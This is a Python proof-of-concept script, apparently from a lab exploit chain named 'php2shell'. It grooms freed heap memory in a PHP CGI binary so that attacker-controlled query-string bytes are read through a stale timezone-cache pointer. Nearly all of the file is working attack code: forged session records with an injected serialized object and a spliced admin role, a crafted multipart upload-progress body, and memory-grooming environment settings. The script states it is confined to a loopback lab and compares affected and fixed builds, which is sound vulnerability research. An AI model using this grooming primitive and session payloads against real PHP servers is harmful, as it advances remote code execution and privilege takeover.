#!/usr/bin/env python3
"""Stage A: groom the freed startup timezone-cache allocation with request data.

Inside the plant's loopback lab (no network). Companion to
lab/repro/php2shell-rung3-tzcache.py: same splice-MID session warning, but the
request also carries a query string. With USE_ZEND_ALLOC=0 the 56-byte
HashTable that php_date_parse_tzfile() allocates at module startup (and that
shutdown_memory_manager() frees at the end of php_module_startup) is reused by
a later 56-byte libc allocation. A query-string value whose zend_string is
56 bytes leaves the attacker's value bytes and length in that chunk; the stale
DATEG(tzcache) pointer then reads them as HashTable fields in
zend_hash_str_find_bucket(). --gdb runs the fieldprobe script that proves the
byte-for-byte correlation.

Usage:
  python3 lab/repro/php2shell-stageA-groom.py CGI_BIN OUTDIR \
      [QUERY_STRING] [MODE] [--gdb]

MODE is splice-mid (default), valid-record, valid-timezone or no-cookie.
Replay the whole proof (affected + fixed builds and controls) with
lab/repro/php2shell-stageA-proof.sh.
"""
import os
import pathlib
import subprocess
import sys
import tempfile

BOUNDARY = '---------------------------20896060251896012921717172737'
SID = 'tzsplice'
OBJ = 'evil|O:8:"stdClass":1:{s:5:"proof";s:5:"pwned";}'
SPLICE_MID = 'data|s:64:"' + 'A' * 88 + OBJ + 'B' * 32 + '";roles|a:1:{i:0;s:5:"admin";}'
VALID_REC = 'roles|a:0:{}'
GDB_PROBE = pathlib.Path(__file__).with_name('php2shell-stageA-fieldprobe.gdb')


def run_leg(php, base, mode, query, log, use_gdb=False):
    sess = base / 'sess'
    sess.mkdir()
    if mode != 'no-record':
        (sess / ('sess_' + SID)).write_text(
            SPLICE_MID if mode == 'splice-mid' else VALID_REC)
    (base / 'worker.php').write_text('<?php echo "worker\\n";')

    parts = []
    if mode != 'no-cookie':
        parts.append('--%s\r\nContent-Disposition: form-data; '
                     'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nprog\r\n' % BOUNDARY)
    parts.append('--%s\r\nContent-Disposition: form-data; name="file1"; '
                 'filename="a.txt"\r\n\r\n1\r\n' % BOUNDARY)
    body = (''.join(parts) + '--%s--\r\n' % BOUNDARY).encode()
    (base / 'body').write_bytes(body)

    env = dict(os.environ)
    # Route emalloc to libc malloc: the freed startup chunk can then be reused
    # by the same-size allocation that carries the attacker's query value.
    env.update(USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1',
               ASAN_OPTIONS='detect_leaks=0:abort_on_error=1',
               UBSAN_OPTIONS='halt_on_error=1:print_stacktrace=1',
               REDIRECT_STATUS='1', REQUEST_METHOD='POST',
               QUERY_STRING=query,
               CONTENT_TYPE='multipart/form-data; boundary=' + BOUNDARY,
               CONTENT_LENGTH=str(len(body)),
               SCRIPT_FILENAME=str(base / 'worker.php'),
               PATH_TRANSLATED=str(base / 'worker.php'))
    if mode != 'no-cookie':
        env['HTTP_COOKIE'] = 'PHPSESSID=' + SID

    args = [str(php), '-n', '-q',
            '-d', 'error_log=%s' % (base / 'error.log'),
            '-d', 'log_errors=1', '-d', 'display_errors=0',
            '-d', 'error_reporting=32767',
            '-d', 'date.timezone=' + ('UTC' if mode == 'valid-timezone' else 'Bogus/Zone'),
            '-d', 'max_input_vars=1000', '-d', 'file_uploads=1',
            '-d', 'upload_max_filesize=1024',
            '-d', 'session.save_path=%s' % sess, '-d', 'session.name=PHPSESSID',
            '-d', 'session.use_strict_mode=0', '-d', 'session.cache_limiter=',
            '-d', 'session.save_handler=files', '-d', 'session.serialize_handler=php',
            '-d', 'session.upload_progress.enabled=1',
            '-d', 'session.upload_progress.cleanup=0',
            '-d', 'session.upload_progress.prefix=upload_progress_',
            '-d', 'session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS',
            '-d', 'session.upload_progress.freq=1%',
            '-d', 'session.upload_progress.min_freq=0.000000001']
    if use_gdb:
        args = ['gdb', '-q', '-batch', '-x', str(GDB_PROBE), '--args'] + args
    log.write('---- mode=%s query=%r gdb=%s ----\n' % (mode, query, use_gdb))
    log.write('cmd=%s\n' % ' '.join(args))
    log.flush()
    with open(base / 'body', 'rb') as fh:
        proc = subprocess.run(args, env=env, stdin=fh, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, timeout=60)
    out = proc.stdout.decode(errors='replace')
    log.write(out)
    log.write('\nrc=%d\n' % proc.returncode)
    err_log = base / 'error.log'
    if err_log.exists():
        log.write('php error_log:\n' + err_log.read_text(errors='replace'))
    signals = [s for s in ('runtime error:', 'AddressSanitizer', 'Assertion',
                           'SEGV', 'SIGSEGV') if s in out]
    log.flush()
    return proc.returncode, signals


def main():
    argv = [a for a in sys.argv[1:] if a != '--gdb']
    use_gdb = '--gdb' in sys.argv[1:]
    php = pathlib.Path(argv[0]).resolve()
    out = pathlib.Path(argv[1] if len(argv) > 1 else 'lab/build/evidence')
    out.mkdir(parents=True, exist_ok=True)
    query = argv[2] if len(argv) > 2 else ''
    mode = argv[3] if len(argv) > 3 else 'splice-mid'
    label = php.parts[-4] if len(php.parts) >= 4 else php.name
    tag = '%s-qs%d' % ('gdb' if use_gdb else 'plain', len(query))
    log_path = out / ('stageA-%s-%s-%s.log' % (label, mode, tag))
    with log_path.open('w') as log:
        with tempfile.TemporaryDirectory(prefix='stageA-', dir=out) as tmp:
            rc, signals = run_leg(php, pathlib.Path(tmp), mode, query, log, use_gdb)
    print('%-24s query=%-22r mode=%-13s rc=%4d sig=%s log=%s' %
          (label, query, mode, rc, ','.join(signals) or '-', log_path))


if __name__ == '__main__':
    main()
